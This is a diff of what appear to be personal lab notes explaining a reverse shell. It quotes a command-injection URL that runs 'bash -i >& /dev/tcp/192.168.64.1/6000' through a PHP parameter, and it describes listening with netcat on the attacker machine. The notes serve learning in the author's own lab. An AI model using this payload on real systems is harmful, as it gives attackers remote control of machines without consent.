@@ -103,4 +103,10 @@ f. %20 is a space
 
     So it basically looks like this:
     ...php?command=bash -c "bash -i >& /dev/tcp/192.168.64.1/6000 0>&1"
-g.
+g. The attacker opens a port, the target connects back to the attacker, bypassing security, 
+    and allows remote control.
+    1. My mac (attacker) opens a port (in this case 6000) and waits 
+        for a connection with the command nc -l 6000
+    2. My kali machine (target) executes reverse shell command, 
+        which connects to my mac.
+    3. My mac gains control of the target (my kali).
